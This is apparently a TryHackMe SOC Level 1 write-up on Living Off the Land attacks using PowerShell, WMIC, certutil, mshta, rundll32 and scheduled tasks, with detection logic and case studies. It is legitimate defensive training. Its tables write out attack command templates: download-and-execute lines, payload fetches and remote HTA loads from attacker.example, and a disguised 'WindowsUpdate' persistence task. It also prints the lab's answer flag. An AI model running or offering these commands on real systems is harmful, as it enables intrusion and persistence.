---

title: Living Off the Land Attacks

date: 2026-08-03 17:00 +0300

categories: [Foundations, Windows]

tags: [living-off-the-land, lolbins, powershell, threat-detection, mitre-attack]

description: "A TryHackMe SOC Level 1 writeup covering how attackers weaponize PowerShell, WMIC, certutil, mshta, rundll32, and scheduled tasks to run and persist without dropping new malware, plus the detection logic that catches each one."

---

## Description

The "Living Off the Land Attacks" room from TryHackMe's SOC Level 1 path covers a detection problem that has quietly become the default rather than the exception: attackers who never install malware at all. Instead of a custom executable that antivirus can fingerprint, they reach for tools Windows ships with by default: PowerShell, WMIC, certutil, mshta, rundll32, and the Task Scheduler. Every one of these binaries is signed by Microsoft, present on nearly every Windows host, and used constantly by legitimate administrators. That overlap is the entire point.

This post walks through what Living Off the Land (LOL, also written LOTL) means, why it works against traditional defenses, the six tools the room focuses on and the exact commands attackers run with them, and the log fields and query logic that separate a sysadmin doing routine work from an attacker hiding inside that same routine. It closes with the room's practical alert-classification exercise and the flag.

## The problem

Antivirus and application allowlisting both assume malicious activity looks different from legitimate activity. A hash doesn't match a known-good signature, or a file tries to run from a path nothing legitimate ever runs from, and the control blocks it. Living Off the Land attacks break that assumption at the root. `powershell.exe`, `wmic.exe`, `certutil.exe`, `mshta.exe`, `rundll32.exe`, and `schtasks.exe` are already on the allowlist, because removing them would break normal IT operations. An attacker who runs code through one of these binaries inherits its trust.

The scale of this shift shows up in vendor telemetry. CrowdStrike's 2026 Global Threat Report found that 82 percent of detections in 2025 involved no malware at all, up from 40 percent in 2019. Adversaries reached that number by relying on valid credentials, native administrative utilities, and legitimate remote access software instead of custom payloads. This isn't a fringe technique reserved for elite state actors. It is the dominant intrusion method across both nation-state espionage and financially motivated crime, and it is why command-line logging, not signature matching, has become the backbone of modern endpoint detection.

The room frames this as a defender's problem of context rather than identification. The tool itself is never the indicator. The parent process, the command-line flags, the destination, and the account running it are what separate a help desk technician from an intruder using the same binary.

## How it works

**Step 1: What counts as living off the land**

Living Off the Land describes any technique where an attacker accomplishes their objective using software already present on the target system rather than software they bring with them. The tools qualify because they are trusted by default, widely deployed, and often exempt from the stricter scrutiny applied to unknown binaries. Using them lets an attacker execute code without writing new files to disk, chain together multi-step actions that resemble normal admin work, and reuse credentials that are already valid on the network.

Two community projects catalog this behavior by platform. LOLBAS (Living Off the Land Binaries and Scripts) documents Windows binaries that ship with the OS and can be repurposed for attacker goals. GTFOBins covers the same idea for Unix and Linux, listing native binaries that can bypass local security restrictions when abused. Both function as reference libraries defenders can search against a command line to check whether a "normal" tool is being used in an abnormal way.

The reason application control struggles here matters for how a SOC prioritizes its controls. Tools like AppLocker and Windows Defender Application Control (WDAC) work by permitting execution based on publisher signature, file path, or hash. `rundll32.exe`, `mshta.exe`, and the rest carry a valid Microsoft signature and sit in `System32`, so they pass every one of those checks by design. Blocking them outright breaks patching, remote administration, and dozens of legitimate workflows, which is why defenders lean on behavioral detection (unusual parent-child process chains, command-line patterns, network connections from tools that shouldn't be making them) instead of trying to blocklist the binaries themselves.

Microsoft's own Sysinternals suite adds a second layer to the same problem. Sysinternals ships signed, trusted admin utilities that IT teams use every day, and two of them show up repeatedly in incident reports: PsExec, which runs commands on a remote system and is a favorite for lateral movement once credentials are compromised, and Autoruns, which enumerates every persistence point on a machine and serves an attacker equally well for discovering or manipulating those same locations. Neither tool is malware. Both are published directly by Microsoft. That combination is exactly why they blend into legitimate admin workflows so well.

**Step 2: PowerShell as the fileless execution engine**

PowerShell is Microsoft's scripting and automation shell, and it is the single most abused LOL tool because it can download, decode, and execute code entirely in memory. A script pulled from the internet and run through `Invoke-Expression` never touches disk, which removes the file-based artifact most antivirus tools rely on.

| Command pattern | What it does |
|---|---|
| `IEX (New-Object Net.WebClient).DownloadString('URL')` | Downloads a remote script as a string and executes it immediately in memory |
| `-EncodedCommand <base64>` | Hides the actual command inside a base64 blob, defeating plain-text log searches |
| `-NoP -NonI -W Hidden -Exec Bypass` | Suppresses the profile, suppresses interactive prompts, hides the window, and skips the execution policy check |

`IEX` is short for `Invoke-Expression`, and paired with `DownloadString` it is the core of the pattern known as a fileless download-and-execute. Because the script body never lands on disk, static file scanning finds nothing. `-EncodedCommand` compounds the problem: a human reviewing raw command-line logs sees a block of base64 rather than readable intent, so simple text-based alerting misses it unless the log pipeline decodes the flag automatically.

Detection here leans on Windows Event ID 4688 (process creation) or Sysmon Event ID 1, along with Event ID 4104 for PowerShell script block logging, which captures the deobfuscated script content even when `-EncodedCommand` was used on the command line. A SIEM search built around command-line substrings such as `*IEX*`, `*-EncodedCommand*`, `*-Exec Bypass*`, and `*DownloadString*`, grouped by host, user, and parent process, surfaces this pattern reliably. MITRE ATT&CK tracks this as T1059.001, Command and Scripting Interpreter: PowerShell.

**Step 3: WMIC for remote execution and reconnaissance**

WMIC, the command-line front end for Windows Management Instrumentation (WMI), lets an operator query and manage systems locally or across the network. Its `process call create` syntax spawns a new process, and combined with the `/node:` flag it does that on a remote host, turning WMIC into a lightweight remote execution tool that needs no additional software.

| Command | Purpose |
|---|---|
| `wmic /node:TARGETHOST process call create "powershell ..."` | Launches a process, in this case PowerShell, on a remote system |
| `wmic /node:TARGETHOST process get name,commandline` | Pulls running processes and their full command lines from a remote host for reconnaissance |
| `wmic process call create "notepad.exe" /hidden` | Spawns a process locally, demonstrating how an attacker can hide execution on the same machine |

The `create` keyword inside `process call create` is what triggers execution, which is why detection rules built around that phrase catch the technique regardless of what payload follows it. Reconnaissance via `process get Name,CommandLine` is quieter and easy to overlook, since querying process lists is routine admin behavior, but at scale across many hosts in a short window it becomes a strong indicator of lateral movement staging.

WMI-based execution maps to MITRE ATT&CK T1047, Windows Management Instrumentation. Detection queries built around `wmic.exe` invoking `process call create` against a `/node:` target outside normal admin tooling, combined with the resulting child process and its parent, give analysts the clearest signal.

**Step 4: Certutil turned into a downloader and decoder**

Certutil ships as a certificate management utility, but two of its flags have nothing to do with certificates in practice: `-urlcache` fetches a file from a URL, and `-decode`/`-encode` convert between binary and base64 text. Because certutil is signed by Microsoft and common in legitimate certificate workflows, its network and file-handling behavior often escapes the scrutiny a tool like curl would draw.

| Command | Purpose |
|---|---|
| `certutil -urlcache -split -f "URL" C:\Users\Public\payload.exe` | Downloads a remote file and writes it to a local path |
| `certutil -decode encoded.b64 decoded.exe` | Converts a base64 text file back into an executable binary |
| `certutil -encode payload.exe payload.b64` | Converts an existing binary into base64 text for staging or transfer |

The download behavior maps to MITRE ATT&CK T1105, Ingress Tool Transfer, since certutil is functioning as a file-retrieval mechanism regardless of its intended purpose. The encode and decode behavior maps to T1140, Deobfuscate/Decode Files or Information, because the attacker is using a trusted utility to reconstruct a binary from a form that bypasses simple content inspection. A file sitting on disk as harmless-looking base64 text can pass casual review right up until certutil turns it back into an executable.

Detection focuses on `certutil.exe` command lines containing `-urlcache`, `-decode`, or `-encode`, cross-referenced with the destination path. Legitimate certificate operations rarely write output to `C:\Users\Public` or `C:\Windows\Temp`, so that path combination narrows the field of false positives.

**Step 5: Mshta running inline scripts through a trusted process**

Mshta executes HTML Application (HTA) files, which can embed VBScript or JavaScript with full access to the Windows Script Host object model. An HTA loaded through mshta runs with the same privileges as the logged-in user, and because mshta.exe is the process making the calls, security tools that trust signed Microsoft binaries often let the activity through unexamined.

| Command | Purpose |
|---|---|
| `mshta "http://attacker.example/payload.hta"` | Loads and executes an HTA file hosted remotely |
| `mshta "javascript:var s=new ActiveXObject('WScript.Shell');s.Run('powershell ...')"` | Runs an inline JavaScript URI that creates a shell object and spawns PowerShell |
| `mshta "C:\Users\Public\malicious.hta"` | Executes a local HTA file, useful when delivered as an email attachment or dropped file |

The second pattern is worth sitting with. An attacker doesn't need to save anything as a file first: a single mshta command containing an inline `javascript:` URI can instantiate a `WScript.Shell` ActiveX object and use it to launch PowerShell directly, chaining two LOL techniques in one line. Cobalt Strike loaders including QakBot and IcedID have relied on this exact bootstrap pattern to get a beacon running while the process tree shows nothing but Microsoft-signed binaries.

This behavior maps to MITRE ATT&CK T1218.005, System Binary Proxy Execution: Mshta. Detection rules watch for `mshta.exe` command lines containing a remote URL, a `javascript:` URI, or a `.hta` extension, correlated against the parent process that spawned mshta in the first place. An email client or browser spawning mshta is a far stronger signal than mshta running from a scheduled admin script.

**Step 6: Rundll32 proxying DLL exports**

Rundll32 loads a DLL and calls one of its exported functions, which is exactly what makes it useful to an attacker: instead of running an executable directly, they can hide code inside a DLL export and let a trusted Microsoft binary be the one that launches it.

| Command | Purpose |
|---|---|
| `rundll32.exe C:\Users\Public\backdoor.dll,Start` | Loads a DLL from a user-writable path and calls its Start export |
| `rundll32.exe url.dll,FileProtocolHandler "http://attacker.example/update.html"` | Invokes a built-in Windows DLL to hand off a remote URL to the system's file protocol handler |
| `rundll32.exe C:\Windows\Temp\loader.dll,Run` | Executes a DLL staged in a temporary directory, often containing loader or shellcode logic |

MITRE ATT&CK catalogs this as T1218.011, System Binary Proxy Execution: Rundll32 (the technique was previously named Signed Binary Proxy Execution before MITRE's rename to System Binary Proxy Execution in a later ATT&CK revision, so both names appear across older and newer write-ups). The `FileProtocolHandler` pattern is a clean example of proxy execution: `url.dll` is a legitimate system component, so the attacker never introduces a new file at all, only a new argument pointing at attacker-controlled infrastructure.

Detection rules key on `rundll32.exe` command lines referencing paths outside `System32`, such as `C:\Users\Public` or `C:\Windows\Temp`, or invoking `url.dll,FileProtocolHandler` with an external address. Because rundll32 is invoked constantly by legitimate software for benign DLL calls, path and destination context matter far more here than the presence of the binary itself.

**Step 7: Scheduled tasks for persistence**

The Windows Task Scheduler is the built-in mechanism for running programs at a specified time, on a trigger such as logon, or on a repeating interval. Every task has a name, a trigger, an action, and an optional run-as account, and because it's a standard administrative feature, tasks blend into normal system logs and are frequently exempt from stricter controls.

| Command | Purpose |
|---|---|
| `schtasks /Create /SC ONLOGON /TN "WindowsUpdate" /TR "powershell ..."` | Creates a task that runs a PowerShell payload every time a user logs on |
| `schtasks /Create /SC DAILY /TN "DailyJob" /TR "C:\Users\Public\encrypt.ps1" /ST 00:05` | Schedules a local script to run once per day at a fixed time |
| `schtasks /Run /TN "WindowsUpdate"` | Triggers a named task to execute immediately, on demand |

Attackers create tasks like this to survive a reboot, to re-launch a payload after other artifacts get cleaned up, or to establish a recurring foothold that requires no further interaction. Naming a task `WindowsUpdate` or `Maintenance` is a deliberate choice: an analyst scanning a task list quickly is far less likely to flag something that sounds like routine system upkeep.

This maps to MITRE ATT&CK T1053.005, Scheduled Task/Job: Scheduled Task, which sits under the Execution, Persistence, and Privilege Escalation tactics simultaneously, reflecting how flexible the mechanism is for an attacker. Detection combines Windows Security log Event ID 4698 (a scheduled task was created) with Sysmon Event ID 1 or Event ID 4688, filtered for `schtasks* /Create` or `schtasks* /Run` in the command line, or for `taskeng.exe` as the parent image. Grouping by task name and trigger type helps an analyst spot the mismatch between an innocuous-sounding name and a suspicious action, such as a task called `WindowsUpdate` whose actual command launches PowerShell with a download string.

**Step 8: Classifying the alerts**

The room's practical section drops the analyst into a lab machine with a queue of alerts generated by the techniques covered in the previous steps, each one requiring a judgment call: malicious or non-malicious. There's no fixed answer key for the individual alerts, since the room generates them per instance, but the classification logic is consistent across every tool covered.

| Tool | Malicious pattern | Benign pattern |
|---|---|---|
| PowerShell | `IEX` with `DownloadString`, `-EncodedCommand`, `-Exec Bypass` | Signed scripts run through normal execution policy, no encoding |
| WMIC | `/node:` targeting an unexpected remote host plus `process call create` | Local queries or creation on hosts covered by known admin tooling |
| Certutil | `-urlcache` pulling from an external URL, `-decode`/`-encode` writing to `Public` or `Temp` | Certificate enrollment or renewal against internal PKI infrastructure |
| Mshta | Remote `.hta` load or a `javascript:` URI | Rare in most environments; legitimate use is uncommon outside specific line-of-business apps |
| Rundll32 | DLL called from `Public` or `Temp`, or `url.dll,FileProtocolHandler` with an external address | DLL calls from `System32` invoked by known installers or updaters |
| Scheduled tasks | `schtasks /Create` with a benign-sounding name, an `ONLOGON` trigger, and a PowerShell action | Tasks created by patch management or backup software with documented naming conventions |

Working through the queue and classifying each alert against this logic returns the flag: `THM{LOL-but-not-that-lol-you-finishit}`.

**Step 9: Reducing the attack surface**

Detection alone doesn't close the gap. The room pairs its six tool breakdowns with a set of preventive controls that reduce how often these techniques succeed in the first place, and each one addresses a specific weakness exploited above.

| Control | What it addresses |
|---|---|
| Layered defense combining endpoint, network, and identity protections | No single control catches every LOL technique, so overlapping visibility across all three layers closes gaps any one layer misses |
| Application control (AppLocker or WDAC) | Restricts which scripts and executables can run, even when the binary itself is signed and trusted |
| Least privilege on system management utilities | Limits WMIC, PsExec, and similar tools to administrators, cutting off the accounts most likely to be phished or credential-stuffed |
| Network and DNS filtering against known-malicious domains and IPs | Blocks the destination even when the download mechanism, like certutil or PowerShell, is legitimate |
| Containment playbooks for isolating compromised systems and revoking credentials | Turns detection into a fast, repeatable response instead of an improvised one |
| Regular review of access, logging coverage, and control lists | Keeps defenses aligned as attackers adjust which LOL tools they favor |

None of these controls depend on identifying a specific malware family, which is the point. They assume the attacker is already inside the trust boundary and using tools the environment was built to allow, and they narrow what that access can accomplish rather than trying to block the tools outright.

## Why it matters

Living Off the Land isn't a theoretical technique reserved for red team exercises. It's the default operating mode for the most consequential intrusions currently tracked by CISA, and the room's own case studies connect directly to campaigns still active today.

Volt Typhoon, the Chinese state-sponsored group named in the room's real-world examples task, is the clearest large-scale demonstration of what LOL techniques buy an attacker. CISA, the NSA, and the FBI issued a joint advisory (AA24-038A) alongside supplemental guidance for identifying and mitigating LOTL techniques, after finding that Volt Typhoon actors had maintained undetected access inside some US critical infrastructure networks for at least five years. Dragos confirmed the group continued targeting US utilities through 2025 and remains active. Their playbook barely touches malware: extensive reconnaissance, valid account abuse for credential access, and native tools like an outdated version of `comsvcs.dll` to dump credentials from memory, all of which look like unremarkable administrative activity unless an analyst is watching for the specific behavioral pattern rather than a file hash.

The room's own case studies point at the same pattern from a different angle. APT29, also tracked as Nobelium and linked to Russia's SVR, has used PowerShell paired with WMI event subscriptions to gain persistence that survives reboots without ever writing a payload to disk: the malicious code sits inside WMI properties, gets read and decrypted at trigger time, and executes from there. That technique, MITRE ATT&CK T1546.003, is precisely why the room asks analysts to know the ID. It's not trivia. A SIEM rule that only watches for new files on disk will never see this persistence mechanism, because there isn't one to see.

Cobalt Strike loaders follow a related logic on the network side. QakBot and IcedID have both been documented staging Cobalt Strike beacons through mshta or rundll32, letting the initial execution look like a signed Microsoft process rather than a new binary. Once that beacon is running, Cobalt Strike frequently pivots laterally over SMB (Server Message Block), the same file and printer sharing protocol every Windows network already uses, chaining beacons peer to peer between compromised hosts instead of opening fresh outbound connections that a network monitor might catch. The C2 traffic hides inside protocol activity a SOC would otherwise ignore as routine file sharing.

The room's second case study, BlackCat/ALPHV, is worth an update. As presented in the room, BlackCat is framed as an active ransomware operation using PowerShell, PsExec, and certutil for lateral movement. That framing described the group accurately at the time, but ALPHV's own infrastructure went dark in March 2024 in what researchers assessed as an exit scam: the operators staged a fake FBI seizure banner, kept a reported 22 million dollar ransom payment owed to an affiliate, and shut down their leak site and negotiation servers rather than face law enforcement pressure directly. As of mid-2026, no independent evidence has surfaced that the original service resumed operations under its own name. The techniques and the affiliates outlasted the brand. Scattered Spider, the social-engineering-focused group behind the 2023 MGM Resorts and Caesars Entertainment breaches, operated as an ALPHV affiliate and has since moved to deploying DragonForce ransomware while keeping the same LOL-heavy playbook: PowerShell and PsExec blended with legitimate remote monitoring and management tools like AnyDesk, TeamViewer, and ScreenConnect. Their 2025 and 2026 campaigns against UK and international retailers, airlines, and manufacturers show the underlying tradecraft outlasting any single ransomware brand it happens to be paired with at a given time.

That persistence is the real lesson for a SOC analyst. CrowdStrike's finding that 82 percent of 2025 detections were malware-free means an analyst who only trusts alerts tied to known-bad file hashes will miss the majority of real intrusions in their environment. The tools in this room, PowerShell, WMIC, certutil, mshta, rundll32, and schtasks, will keep showing up in legitimate admin work every single day. The skill this room builds isn't recognizing the tool. It's recognizing the specific combination of flags, destination, parent process, and account context that turns routine administration into an attacker's foothold.

## Key takeaways

- Living Off the Land attacks use built-in, signed Windows tools instead of custom malware, which lets them defeat signature-based antivirus and pass application allowlisting checks that key on publisher trust rather than behavior.
- PowerShell's `IEX`/`DownloadString` pattern and `-EncodedCommand` flag enable fileless execution that leaves no file on disk for static scanners to find; Event ID 4104 script block logging captures the deobfuscated content regardless.
- WMIC's `process call create`, combined with `/node:` targeting a remote host, functions as a built-in remote execution tool that needs no additional software to move laterally.
- Certutil's `-urlcache` flag downloads files (T1105) and its `-decode`/`-encode` flags convert between binary and text (T1140), turning a certificate utility into a file staging tool.
- Mshta and rundll32 both proxy execution through a Microsoft-signed process (T1218.005 and T1218.011), letting an attacker run inline scripts or DLL exports while the process tree shows only trusted binaries.
- Scheduled tasks (T1053.005) give attackers persistence across reboots, most convincingly when named to resemble routine system maintenance like `WindowsUpdate`.
- Detection depends on context, not the presence of the tool: parent process, command-line flags, destination path, and account behavior separate an administrator from an intruder using the identical binary.
- Volt Typhoon and Scattered Spider show that LOL tradecraft outlives any individual malware family or ransomware brand built around it, which is why behavioral detection remains more durable than hash-based blocking.